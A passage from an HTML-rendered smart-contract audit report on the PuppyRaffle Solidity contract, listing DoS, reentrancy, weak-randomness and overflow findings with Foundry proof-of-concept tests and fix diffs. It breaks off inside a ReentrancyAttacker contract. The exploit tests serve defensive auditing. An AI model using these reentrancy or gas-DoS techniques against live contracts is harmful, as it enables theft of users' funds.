KcxqE9xyaYIz3q2FBHSpNinAx1qSefUoeSM/KCasxRCJcnANTsgEm0dAKhn9K0hFAhrMX6dPrUbQ7sgjikTgkVaXnArUbZmS2oQ5C5FLFGOO3NaRUHtUJQLLgCsZxtqibmhp4VYyxODTHny5yaWB2W3wO9U5mPmGovYix/9k=" alt="Logo" class="cover-logo" /></p>
+<h1 class="cover-title">
+PuppyRaffle Audit Report
+</h1>
+<p class="cover-version">
+Version 1.0
+</p>
+<p class="cover-org">
+<em>Mohammad Ayaan</em><br/>moayaan.com
+</p>
+<p class="cover-date">
+November 13, 2026
+</p>
+</div>
+<div class="page-break">
+
+</div>
+<p>Prepared by: <a href="https://moayaan.com">Mohammad Ayaan</a></p>
+<p>Lead Auditors:</p>
+<ul>
+<li>Mohammad Ayaan</li>
+</ul>
+<h1 id="table-of-contents">Table of Contents</h1>
+<ul>
+<li><a href="#table-of-contents">Table of Contents</a></li>
+<li><a href="#protocol-summary">Protocol Summary</a></li>
+<li><a href="#disclaimer">Disclaimer</a></li>
+<li><a href="#risk-classification">Risk Classification</a></li>
+<li><a href="#audit-details">Audit Details</a>
+<ul>
+<li><a href="#scope">Scope</a></li>
+<li><a href="#roles">Roles</a></li>
+</ul></li>
+<li><a href="#executive-summary">Executive Summary</a>
+<ul>
+<li><a href="#issues-found">Issues found</a></li>
+</ul></li>
+<li><a href="#findings">Findings</a></li>
+<li><a href="#high">High</a>
+<ul>
+<li><a href="#h-1-unchecked-looping-for-duplicate-checking-in-puppyraffleenterraffle-function-can-lead-to-a-dos-attack-with-high-gas-fees">[H-1] Unchecked looping for duplicate checking in <code>PuppyRaffle::enterRaffle</code> function, can lead to a DoS attack with high gas fees!</a></li>
+<li><a href="#h-2-external-call-made-before-state-change-in-refund-function-an-open-invitation-for-a-reentrancy-attack">[H-2] External call made before state change in <code>refund</code> function, an open invitation for a reentrancy attack</a></li>
+<li><a href="#h-3-weak-randomness-in-puppyraffleselectwinner-function-an-attacker-can-grind-the-block-values-and-hand-pick-the-winner-and-the-puppy-rarity">[H-3] Weak randomness in <code>PuppyRaffle::selectWinner</code> function, an attacker can grind the block values and hand-pick the winner and the puppy rarity</a></li>
+<li><a href="#h-4-mishandling-of-eth-in-puppyrafflewithdrawfees-function-selfdestruct-can-break-the-strict-balance-check-and-lock-the-fees-forever">[H-4] Mishandling of ETH in <code>PuppyRaffle::withdrawFees</code> function, selfdestruct can break the strict balance check and lock the fees forever</a></li>
+</ul></li>
+<li><a href="#medium">Medium</a>
+<ul>
+<li><a href="#m-1-arithmetic-overflow-in-puppyraffleselectwinner-totalfees-wraps-around-because-the-contract-runs-solidity-076">[M-1] Arithmetic overflow in <code>PuppyRaffle::selectWinner</code>, <code>totalFees</code> wraps around because the contract runs Solidity 0.7.6</a></li>
+<li><a href="#m-2-unsafe-casting-of-uint256-down-to-uint64-in-puppyraffleselectwinner-the-recorded-fee-silently-loses-most-of-its-value">[M-2] Unsafe casting of <code>uint256</code> down to <code>uint64</code> in <code>PuppyRaffle::selectWinner</code>, the recorded fee silently loses most of its value</a></li>
+</ul></li>
+<li><a href="#low">Low</a>
+<ul>
+<li><a href="#l-1-loop-based-membership-check-in-puppyraffle_isactiveplayer-function-it-should-use-a-mapping-instead-of-iterating-the-array">[L-1] Loop based membership check in <code>PuppyRaffle::_isActivePlayer</code> function, it should use a mapping instead of iterating the array</a></li>
+</ul></li>
+<li><a href="#question">Question</a>
+<ul>
+<li><a href="#q-1-missing-check-for-an-empty-players-array-in-puppyraffleenterraffle-function-can-lead-to-a-0-eth-call-that-emits-raffleenter-and-wastes-gas">[Q-1] Missing check for an empty players array in <code>PuppyRaffle::enterRaffle</code> function, can lead to a 0 ETH call that emits <code>RaffleEnter</code> and wastes gas</a></li>
+</ul></li>
+<li><a href="#informational">Informational</a>
+<ul>
+<li><a href="#i-1-puppyrafflegetactiveplayerindex-returns-0-for-inactive-players-making-not-found-look-exactly-like-the-player-at-index-0">[I-1] <code>PuppyRaffle::getActivePlayerIndex</code> returns 0 for inactive players, making “not found” look exactly like the player at index 0</a></li>
+<li><a href="#i-2-floating-and-outdated-pragma-in-puppyraffle-contract-the-old-compiler-version-misses-built-in-overflow-checks-and-other-fixes">[I-2] Floating and outdated pragma in <code>PuppyRaffle</code> contract, the old compiler version misses built-in overflow checks and other fixes</a></li>
+<li><a href="#i-3-non-constant-image-uri-variables-in-puppyraffle-contract-they-never-change-and-only-cost-gas-at-deployment">[I-3] Non-constant image URI variables in <code>PuppyRaffle</code> contract, they never change and only cost gas at deployment</a></li>
+<li><a href="#i-4-missing-zero-value-checks-on-the-constructor-parameters-in-puppyraffle-constructor-a-misconfigured-deployment-can-be-impossible-to-fix">[I-4] Missing zero value checks on the constructor parameters in <code>PuppyRaffle</code> constructor, a misconfigured deployment can be impossible to fix</a></li>
+<li><a href="#i-5-no-early-return-for-an-empty-players-array-in-puppyraffleenterraffle-function-a-call-that-adds-nobody-still-loops-and-emits-raffleenter">[I-5] No early return for an empty players array in <code>PuppyRaffle::enterRaffle</code> function, a call that adds nobody still loops and emits <code>RaffleEnter</code></a></li>
+<li><a href="#i-6-storage-array-length-is-read-on-every-iteration-in-puppyrafflegetactiveplayerindex-function-caching-it-in-memory-saves-gas">[I-6] Storage array length is read on every iteration in <code>PuppyRaffle::getActivePlayerIndex</code> function, caching it in memory saves gas</a></li>
+<li><a href="#i-7-magic-numbers-for-the-prize-and-fee-split-in-puppyraffleselectwinner-function-the-8020-values-should-be-named-constants">[I-7] Magic numbers for the prize and fee split in <code>PuppyRaffle::selectWinner</code> function, the 80/20 values should be named constants</a></li>
+<li><a href="#i-8-missing-zero-address-check-in-puppyrafflechangefeeaddress-function-the-owner-can-accidentally-send-the-fees-to-address0">[I-8] Missing zero address check in <code>PuppyRaffle::changeFeeAddress</code> function, the owner can accidentally send the fees to <code>address(0)</code></a></li>
+<li><a href="#i-9-unused-_isactiveplayer-function-in-puppyraffle-contract-dead-code-that-only-adds-review-surface">[I-9] Unused <code>_isActivePlayer</code> function in <code>PuppyRaffle</code> contract, dead code that only adds review surface</a></li>
+</ul></li>
+<li><a href="#gas">Gas</a></li>
+</ul>
+<h1 id="protocol-summary">Protocol Summary</h1>
+<p>PuppyRaffle is a raffle protocol where players pay an entrance fee to enter a draw for a puppy NFT. Duplicate entrants are not allowed, players can refund their ticket, and a winner is drawn after the raffle duration. The pot is split 80% to the winner and 20% to the protocol feeAddress.</p>
+<h1 id="disclaimer">Disclaimer</h1>
+<p>Mohammad Ayaan makes all effort to find as many vulnerabilities in the code in the given time period, but holds no responsibilities for the findings provided in this document. A security audit by the team is not an endorsement of the underlying business or product. The audit was time-boxed and the review of the code was solely on the security aspects of the Solidity implementation of the contracts.</p>
+<h1 id="risk-classification">Risk Classification</h1>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+<th>Impact</th>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td></td>
+<td>High</td>
+<td>Medium</td>
+<td>Low</td>
+</tr>
+<tr>
+<td></td>
+<td>High</td>
+<td>H</td>
+<td>H/M</td>
+<td>M</td>
+</tr>
+<tr>
+<td>Likelihood</td>
+<td>Medium</td>
+<td>H/M</td>
+<td>M</td>
+<td>M/L</td>
+</tr>
+<tr>
+<td></td>
+<td>Low</td>
+<td>M</td>
+<td>M/L</td>
+<td>L</td>
+</tr>
+</tbody>
+</table>
+<p>We use the <a href="https://docs.codehawks.com/hawks-auditors/how-to-evaluate-a-finding-severity">CodeHawks</a> severity matrix to determine severity. See the documentation for more details.</p>
+<h1 id="audit-details">Audit Details</h1>
+<p><strong>The findings described in this document correspond to the following commit hash:</strong></p>
+<pre><code>89ac8aba8a15192b58ec24f4476fd1db96432063</code></pre>
+<p>The client README pointed at a stale commit hash, so the latest commit was audited from the working branch <code>audit-by-ayaan</code> instead.</p>
+<h2 id="scope">Scope</h2>
+<pre><code>./src/
+└── PuppyRaffle.sol</code></pre>
+<h2 id="roles">Roles</h2>
+<ul>
+<li><strong>Owner:</strong> can change the <code>feeAddress</code>.</li>
+<li><strong>Players:</strong> can enter the raffle and refund their own ticket.</li>
+<li><strong>Anyone:</strong> can call <code>selectWinner</code> once the raffle duration has passed, and <code>withdrawFees</code> when no player funds are active.</li>
+</ul>
+<h1 id="executive-summary">Executive Summary</h1>
+<p>This was a time-boxed review of the PuppyRaffle contract, using static analysis with Slither and Aderyn together with manual review. The review found 4 High, 2 Medium, 1 Low, 1 Question and 9 Informational findings. The most serious are the unbounded duplicate-check loop (DoS), the ReEntrancy in <code>refund</code>, the weak randomness in <code>selectWinner</code>, and the mishandling of ETH in <code>withdrawFees</code>. Every finding is tagged inline in the contract with <code>// @AUDIT-*</code> comments, and working Foundry tests were written for every High, Medium and Low finding (27 tests passing in total).</p>
+<h2 id="issues-found">Issues found</h2>
+<table>
+<thead>
+<tr>
+<th>Severity</th>
+<th>Number of issues found</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>High</td>
+<td>4</td>
+</tr>
+<tr>
+<td>Medium</td>
+<td>2</td>
+</tr>
+<tr>
+<td>Low</td>
+<td>1</td>
+</tr>
+<tr>
+<td>Question</td>
+<td>1</td>
+</tr>
+<tr>
+<td>Informational</td>
+<td>9</td>
+</tr>
+<tr>
+<td>Gas</td>
+<td>0</td>
+</tr>
+<tr>
+<td><strong>Total</strong></td>
+<td><strong>17</strong></td>
+</tr>
+</tbody>
+</table>
+<h1 id="findings">Findings</h1>
+<h1 id="high">High</h1>
+<h3 id="h-1-unchecked-looping-for-duplicate-checking-in-puppyraffleenterraffle-function-can-lead-to-a-dos-attack-with-high-gas-fees">[H-1] Unchecked looping for duplicate checking in <code>PuppyRaffle::enterRaffle</code> function, can lead to a DoS attack with high gas fees!</h3>
+<p><strong>Description:</strong> The <code>enterRaffle</code> function has an unchecked loop which can lead to an uncontrolled gas cost increase as players continue to enter the raffle. A black hat can exploit this by entering with thousands (or more) wallet addresses, making it unaffordable for later legitimate users to enter the raffle.</p>
+<p><strong>Impact:</strong> Uncontrolled gas cost increase can lead to a DoS attack on the protocol.</p>
+<p><strong>Proof of Concept:</strong> Check the <code>test_DenialOfService_AUDIT</code> test in the <code>PuppyRaffleTest.t.sol</code> file.</p>
+<details open>
+<summary>
+Here’s the full code
+</summary>
+<div class="sourceCode" id="cb3"><div class="codehilite"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a>    <span class="kw">function</span> <span class="fu">test_DenialOfService_AUDIT</span>() <span class="kw">public</span> {</span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a>        uint256 playersNum <span class="op">=</span> <span class="dv">100</span><span class="op">;</span></span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a>        address[] memory players <span class="op">=</span> <span class="kw">new</span> address[](playersNum)<span class="op">;</span></span>
+<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a>        <span class="cf">for</span> (uint256 i <span class="op">=</span> <span class="dv">0</span><span class="op">;</span> i <span class="op">&lt;</span> playersNum<span class="op">;</span> i<span class="op">++</span>) {</span>
+<span id="cb3-5"><a href="#cb3-5" aria-hidden="true" tabindex="-1"></a>            players[i] <span class="op">=</span> <span class="fu">address</span>(i)<span class="op">;</span></span>
+<span id="cb3-6"><a href="#cb3-6" aria-hidden="true" tabindex="-1"></a>        }</span>
+<span id="cb3-7"><a href="#cb3-7" aria-hidden="true" tabindex="-1"></a>        <span class="co">// check how much gas it costs for the first 100 players</span></span>
+<span id="cb3-8"><a href="#cb3-8" aria-hidden="true" tabindex="-1"></a>        uint256 gasBefore <span class="op">=</span> <span class="fu">gasleft</span>()<span class="op">;</span></span>
+<span id="cb3-9"><a href="#cb3-9" aria-hidden="true" tabindex="-1"></a>        puppyRaffle<span class="op">.</span><span class="at">enterRaffle</span>{<span class="dt">value</span><span class="op">:</span> entranceFee <span class="op">*</span> players<span class="op">.</span><span class="at">length</span>}(players)<span class="op">;</span></span>
+<span id="cb3-10"><a href="#cb3-10" aria-hidden="true" tabindex="-1"></a>        uint256 gasAfter <span class="op">=</span> <span class="fu">gasleft</span>()<span class="op">;</span></span>
+<span id="cb3-11"><a href="#cb3-11" aria-hidden="true" tabindex="-1"></a>        uint256 gasUsedFirst <span class="op">=</span> gasBefore <span class="op">-</span> gasAfter<span class="op">;</span></span>
+<span id="cb3-12"><a href="#cb3-12" aria-hidden="true" tabindex="-1"></a>        console2<span class="op">.</span><span class="fu">log</span>(<span class="st">&quot;Gas used for first 100 players:&quot;</span><span class="op">,</span> gasUsedFirst)<span class="op">;</span></span>
+<span id="cb3-13"><a href="#cb3-13" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-14"><a href="#cb3-14" aria-hidden="true" tabindex="-1"></a>        address[] memory playersTwo <span class="op">=</span> <span class="kw">new</span> address[](playersNum)<span class="op">;</span></span>
+<span id="cb3-15"><a href="#cb3-15" aria-hidden="true" tabindex="-1"></a>        <span class="cf">for</span> (uint256 i <span class="op">=</span> <span class="dv">0</span><span class="op">;</span> i <span class="op">&lt;</span> playersNum<span class="op">;</span> i<span class="op">++</span>) {</span>
+<span id="cb3-16"><a href="#cb3-16" aria-hidden="true" tabindex="-1"></a>            playersTwo[i] <span class="op">=</span> <span class="fu">address</span>(i <span class="op">+</span> playersNum)<span class="op">;</span></span>
+<span id="cb3-17"><a href="#cb3-17" aria-hidden="true" tabindex="-1"></a>        }</span>
+<span id="cb3-18"><a href="#cb3-18" aria-hidden="true" tabindex="-1"></a>        <span class="co">// check how much gas it costs for the second 100 players</span></span>
+<span id="cb3-19"><a href="#cb3-19" aria-hidden="true" tabindex="-1"></a>        uint256 gasBeforeTwo <span class="op">=</span> <span class="fu">gasleft</span>()<span class="op">;</span></span>
+<span id="cb3-20"><a href="#cb3-20" aria-hidden="true" tabindex="-1"></a>        puppyRaffle<span class="op">.</span><span class="at">enterRaffle</span>{<span class="dt">value</span><span class="op">:</span> entranceFee <span class="op">*</span> players<span class="op">.</span><span class="at">length</span>}(</span>
+<span id="cb3-21"><a href="#cb3-21" aria-hidden="true" tabindex="-1"></a>            playersTwo</span>
+<span id="cb3-22"><a href="#cb3-22" aria-hidden="true" tabindex="-1"></a>        )<span class="op">;</span></span>
+<span id="cb3-23"><a href="#cb3-23" aria-hidden="true" tabindex="-1"></a>        uint256 gasAfterTwo <span class="op">=</span> <span class="fu">gasleft</span>()<span class="op">;</span></span>
+<span id="cb3-24"><a href="#cb3-24" aria-hidden="true" tabindex="-1"></a>        uint256 gasUsedTwo <span class="op">=</span> gasBeforeTwo <span class="op">-</span> gasAfterTwo<span class="op">;</span></span>
+<span id="cb3-25"><a href="#cb3-25" aria-hidden="true" tabindex="-1"></a>        console2<span class="op">.</span><span class="fu">log</span>(<span class="st">&quot;Gas used for second 100 players:&quot;</span><span class="op">,</span> gasUsedTwo)<span class="op">;</span></span>
+<span id="cb3-26"><a href="#cb3-26" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-27"><a href="#cb3-27" aria-hidden="true" tabindex="-1"></a>        console2<span class="op">.</span><span class="fu">log</span>(<span class="st">&quot;Gas Difference:&quot;</span><span class="op">,</span> gasUsedTwo <span class="op">-</span> gasUsedFirst)<span class="op">;</span></span>
+<span id="cb3-28"><a href="#cb3-28" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-29"><a href="#cb3-29" aria-hidden="true" tabindex="-1"></a>        <span class="fu">assert</span>(gasUsedFirst <span class="op">&lt;</span> gasUsedTwo)<span class="op">;</span></span>
+<span id="cb3-30"><a href="#cb3-30" aria-hidden="true" tabindex="-1"></a>    }</span></code></pre></div></div>
+</details>
+<p>You can run it via</p>
+<div class="sourceCode" id="cb4"><div class="codehilite"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="ex">forge</span> test <span class="at">--mt</span> test_DenialOfService_AUDIT <span class="at">-vvv</span></span></code></pre></div></div>
+<p>and check the output proving that the gas difference between the first 100 and the next 100 is so massive that it becomes unaffordable. You will get an output like this:</p>
+<pre class="text"><code>Logs:
+  Gas used for first 100 players: 6538557
+  Gas used for second 100 players: 19242109
+  Gas Difference: 12703552</code></pre>
+<p><strong>Recommended Mitigation:</strong> 1. Consider allowing duplicates. Users can make new wallet addresses anyway, so a duplicate check only stops the same wallet address, not the same person from entering multiple times.</p>
+<ol start="2" type="1">
+<li>Consider using a mapping to check duplicates. This would allow you to check for duplicates in constant time rather than linear time. Each raffle could have a <code>uint256</code> id, and the mapping would map a player address to the raffle id.</li>
+</ol>
+<div class="sourceCode" id="cb6"><div class="codehilite"><pre class="sourceCode diff"><code class="sourceCode diff"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="va">+    mapping(address =&gt; uint256) public addressToRaffleId;</span></span>
+<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a><span class="va">+    uint256 public raffleId = 0;</span></span>
+<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a>     .</span>
+<span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a>     .</span>
+<span id="cb6-5"><a href="#cb6-5" aria-hidden="true" tabindex="-1"></a>     .</span>
+<span id="cb6-6"><a href="#cb6-6" aria-hidden="true" tabindex="-1"></a>     function enterRaffle(address[] memory newPlayers) public payable {</span>
+<span id="cb6-7"><a href="#cb6-7" aria-hidden="true" tabindex="-1"></a>         require(msg.value == entranceFee * newPlayers.length, &quot;PuppyRaffle: Must send enough to enter raffle&quot;);</span>
+<span id="cb6-8"><a href="#cb6-8" aria-hidden="true" tabindex="-1"></a>         for (uint256 i = 0; i &lt; newPlayers.length; i++) {</span>
+<span id="cb6-9"><a href="#cb6-9" aria-hidden="true" tabindex="-1"></a>             players.push(newPlayers[i]);</span>
+<span id="cb6-10"><a href="#cb6-10" aria-hidden="true" tabindex="-1"></a><span class="va">+            addressToRaffleId[newPlayers[i]] = raffleId;</span></span>
+<span id="cb6-11"><a href="#cb6-11" aria-hidden="true" tabindex="-1"></a>         }</span>
+<span id="cb6-12"><a href="#cb6-12" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-13"><a href="#cb6-13" aria-hidden="true" tabindex="-1"></a><span class="st">-        // Check for duplicates</span></span>
+<span id="cb6-14"><a href="#cb6-14" aria-hidden="true" tabindex="-1"></a><span class="va">+       // Check for duplicates only from the new players</span></span>
+<span id="cb6-15"><a href="#cb6-15" aria-hidden="true" tabindex="-1"></a><span class="va">+       for (uint256 i = 0; i &lt; newPlayers.length; i++) {</span></span>
+<span id="cb6-16"><a href="#cb6-16" aria-hidden="true" tabindex="-1"></a><span class="va">+          require(addressToRaffleId[newPlayers[i]] != raffleId, &quot;PuppyRaffle: Duplicate player&quot;);</span></span>
+<span id="cb6-17"><a href="#cb6-17" aria-hidden="true" tabindex="-1"></a><span class="va">+       }</span></span>
+<span id="cb6-18"><a href="#cb6-18" aria-hidden="true" tabindex="-1"></a><span class="st">-        for (uint256 i = 0; i &lt; players.length; i++) {</span></span>
+<span id="cb6-19"><a href="#cb6-19" aria-hidden="true" tabindex="-1"></a><span class="st">-            for (uint256 j = i + 1; j &lt; players.length; j++) {</span></span>
+<span id="cb6-20"><a href="#cb6-20" aria-hidden="true" tabindex="-1"></a><span class="st">-                require(players[i] != players[j], &quot;PuppyRaffle: Duplicate player&quot;);</span></span>
+<span id="cb6-21"><a href="#cb6-21" aria-hidden="true" tabindex="-1"></a><span class="st">-            }</span></span>
+<span id="cb6-22"><a href="#cb6-22" aria-hidden="true" tabindex="-1"></a><span class="st">-        }</span></span>
+<span id="cb6-23"><a href="#cb6-23" aria-hidden="true" tabindex="-1"></a>         emit RaffleEnter(newPlayers);</span>
+<span id="cb6-24"><a href="#cb6-24" aria-hidden="true" tabindex="-1"></a>     }</span>
+<span id="cb6-25"><a href="#cb6-25" aria-hidden="true" tabindex="-1"></a> .</span>
+<span id="cb6-26"><a href="#cb6-26" aria-hidden="true" tabindex="-1"></a> .</span>
+<span id="cb6-27"><a href="#cb6-27" aria-hidden="true" tabindex="-1"></a> .</span>
+<span id="cb6-28"><a href="#cb6-28" aria-hidden="true" tabindex="-1"></a>     function selectWinner() external {</span>
+<span id="cb6-29"><a href="#cb6-29" aria-hidden="true" tabindex="-1"></a><span class="va">+       raffleId = raffleId + 1;</span></span>
+<span id="cb6-30"><a href="#cb6-30" aria-hidden="true" tabindex="-1"></a>         require(block.timestamp &gt;= raffleStartTime + raffleDuration, &quot;PuppyRaffle: Raffle not over&quot;);</span></code></pre></div></div>
+<ol start="3" type="1">
+<li>Alternatively, you could use <a href="https://docs.openzeppelin.com/contracts/3.x/api/utils#EnumerableSet">OpenZeppelin’s <code>EnumerableSet</code> library</a>.</li>
+</ol>
+<hr />
+<h3 id="h-2-external-call-made-before-state-change-in-refund-function-an-open-invitation-for-a-reentrancy-attack">[H-2] External call made before state change in <code>refund</code> function, an open invitation for a reentrancy attack</h3>
+<p><strong>Description:</strong> The <code>refund</code> function in the <code>PuppyRaffle</code> contract is not following the CEI (Checks-Effects-Interactions) pattern, nor does it use OpenZeppelin’s reentrancy guard. This can lead to a reentrancy attack by an attacker contract.</p>
+<p><strong>Impact:</strong> Reentrancy attack as a result of missing reentrancy checks and not following the CEI pattern.</p>
+<p><strong>Proof of Concept:</strong> Check the <code>test_ReEntrancy_AUDIT</code> test &amp; <code>ReentrancyAttacker</code> contract in the <code>PuppyRaffleTest.t.sol</code> file:</p>
+<details open>
+<summary>
+Here’s the full code
+</summary>
+<div class="sourceCode" id="cb7"><div class="codehilite"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a>    <span class="kw">function</span> <span class="fu">test_ReEntrancy_AUDIT</span>() <span class="kw">public</span> {</span>
+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a>        address[] memory players <span class="op">=</span> <span class="kw">new</span> address[](<span class="dv">4</span>)<span class="op">;</span></span>
+<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a>        players[<span class="dv">0</span>] <span class="op">=</span> playerOne<span class="op">;</span></span>
+<span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a>        players[<span class="dv">1</span>] <span class="op">=</span> playerTwo<span class="op">;</span></span>
+<span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a>        players[<span class="dv">2</span>] <span class="op">=</span> playerThree<span class="op">;</span></span>
+<span id="cb7-6"><a href="#cb7-6" aria-hidden="true" tabindex="-1"></a>        players[<span class="dv">3</span>] <span class="op">=</span> playerFour<span class="op">;</span></span>
+<span id="cb7-7"><a href="#cb7-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-8"><a href="#cb7-8" aria-hidden="true" tabindex="-1"></a>        puppyRaffle<span class="op">.</span><span class="at">enterRaffle</span>{<span class="dt">value</span><span class="op">:</span> entranceFee <span class="op">*</span> <span class="dv">4</span>}(players)<span class="op">;</span></span>
+<span id="cb7-9"><a href="#cb7-9" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-10"><a href="#cb7-10" aria-hidden="true" tabindex="-1"></a>        ReentrancyAttacker attackerContract <span class="op">=</span> <span class="kw">new</span> <span class="fu">ReentrancyAttacker</span>(</span>
+<span id="cb7-11"><a href="#cb7-11" aria-hidden="true" tabindex="-1"></a>            puppyRaffle</span>
+<span id="cb7-12"><a href="#cb7-12" aria-hidden="true" tabindex="-1"></a>        )<span class="op">;</span></span>
+<span id="cb7-13"><a href="#cb7-13" aria-hidden="true" tabindex="-1"></a>        address attackerAddress <span class="op">=</span> <span class="fu">makeAddr</span>(<span class="st">&quot;attackerAddress&quot;</span>)<span class="op">;</span></span>
+<span id="cb7-14"><a href="#cb7-14" aria-hidden="true" tabindex="-1"></a>        vm<span class="op">.</span><span class="fu">deal</span>(attackerAddress<span class="op">,</span> <span class="dv">1</span> ether)<span class="op">;</span></span>
+<span id="cb7-15"><a href="#cb7-15" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-16"><a href="#cb7-16" aria-hidden="true" tabindex="-1"></a>        uint256 startingAttackerContractBalance <span class="op">=</span> <span class="fu">address</span>(attackerContract)</span>
+<span id="cb7-17"><a href="#cb7-17" aria-hidden="true" tabindex="-1"></a>            <span class="op">.</span><span class="at">balance</span><span class="op">;</span></span>
+<span id="cb7-18"><a href="#cb7-18" aria-hidden="true" tabindex="-1"></a>        uint256 startingRaffleBalance <span class="op">=</span> <span class="fu">address</span>(puppyRaffle)<span class="op">.</span><span class="at">balance</span><span class="op">;</span></span>
+<span id="cb7-19"><a href="#cb7-19" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-20"><a href="#cb7-20" aria-hidden="true" tabindex="-1"></a>        console2<span class="op">.</span><span class="fu">log</span>(</span>
+<span id="cb7-21"><a href="#cb7-21" aria-hidden="true" tabindex="-1"></a>            <span class="st">&quot;Starting Attacker Contract Balance:&quot;</span><span class="op">,</span></span>
+<span id="cb7-22"><a href="#cb7-22" aria-hidden="true" tabindex="-1"></a>            startingAttackerContractBalance</span>
+<span id="cb7-23"><a href="#cb7-23" aria-hidden="true" tabindex="-1"></a>        )<span class="op">;</span></span>
+<span id="cb7-24"><a href="#cb7-24" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-25"><a href="#cb7-25" aria-hidden="true" tabindex="-1"></a>        console2<span class="op">.</span><span class="fu">log</span>(</span>
+<span id="cb7-26"><a href="#cb7-26" aria-hidden="true" tabindex="-1"></a>            <span class="st">&quot;Starting Raffle Contract Balance:&quot;</span><span class="op">,</span></span>
+<span id="cb7-27"><a href="#cb7-27" aria-hidden="true" tabindex="-1"></a>            startingRaffleBalance</span>
+<span id="cb7-28"><a href="#cb7-28" aria-hidden="true" tabindex="-1"></a>        )<span class="op">;</span></span>
+<span id="cb7-29"><a href="#cb7-29" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-30"><a href="#cb7-30" aria-hidden="true" tabindex="-1"></a>        <span class="co">// attack</span></span>
+<span id="cb7-31"><a href="#cb7-31" aria-hidden="true" tabindex="-1"></a>        vm<span class="op">.</span><span class="fu">prank</span>(attackerAddress)<span class="op">;</span></span>
+<span id="cb7-32"><a href="#cb7-32" aria-hidden="true" tabindex="-1"></a>        attackerContract<span class="op">.</span><span class="at">attack</span>{<span class="dt">value</span><span class="op">:</span> entranceFee}()<span class="op">;</span></span>
+<span id="cb7-33"><a href="#cb7-33" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-34"><a href="#cb7-34" aria-hidden="true" tabindex="-1"></a>        uint256 endingAttackerContractBalance <span class="op">=</span> <span class="fu">address</span>(attackerContract)</span>
+<span id="cb7-35"><a href="#cb7-35" aria-hidden="true" tabindex="-1"></a>            <span class="op">.</span><span class="at">balance</span><span class="op">;</span></span>
+<span id="cb7-36"><a href="#cb7-36" aria-hidden="true" tabindex="-1"></a>        uint256 endingRaffleBalance <span class="op">=</span> <span class="fu">address</span>(puppyRaffle)<span class="op">.</span><span class="at">balance</span><span class="op">;</span></span>
+<span id="cb7-37"><a href="#cb7-37" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-38"><a href="#cb7-38" aria-hidden="true" tabindex="-1"></a>        console2<span class="op">.</span><span class="fu">log</span>(</span>
+<span id="cb7-39"><a href="#cb7-39" aria-hidden="true" tabindex="-1"></a>            <span class="st">&quot;Ending Attacker Contract Balance:&quot;</span><span class="op">,</span></span>
+<span id="cb7-40"><a href="#cb7-40" aria-hidden="true" tabindex="-1"></a>            endingAttackerContractBalance</span>
+<span id="cb7-41"><a href="#cb7-41" aria-hidden="true" tabindex="-1"></a>        )<span class="op">;</span></span>
+<span id="cb7-42"><a href="#cb7-42" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-43"><a href="#cb7-43" aria-hidden="true" tabindex="-1"></a>        console2<span class="op">.</span><span class="fu">log</span>(<span class="st">&quot;Ending Raffle Contract Balance:&quot;</span><span class="op">,</span> endingRaffleBalance)<span class="op">;</span></span>
+<span id="cb7-44"><a href="#cb7-44" aria-hidden="true" tabindex="-1"></a>    }</span></code></pre></div></div>
+</details>
+<details open>
+<summary>
+Here’s the full code
+</summary>
+<div class="sourceCode" id="cb8"><div class="codehilite"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a>contract ReentrancyAttacker {</span>
+<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a>    PuppyRaffle puppyRaffle<span class="op">;</span></span>
+<span id="cb8-3"><a href="#cb8-3" aria-hidden="true" tabindex="-1"></a>    uint256 attackerIndex<span class="op">;</span></span>
+<span id="cb8-4"><a href="#cb8-4" aria-hidden="true" tabindex="-1"></a>    uint256 entranceFee<span class="op">;</span></span>
+<span id="cb8-5"><a href="#cb8-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb8-6"><a href="#cb8-6" aria-hidden="true" tabindex="-1"></a>    <span class="fu">constructor</span>(PuppyRaffle _puppyRaffle) {</span>
+<span id="cb8-7"><a href="#cb8-7" aria-hidden="true" tabindex="-1"></a>        puppyRaffle <span class="op">=</span> _puppyRaffle<span class="op">;</span></span>
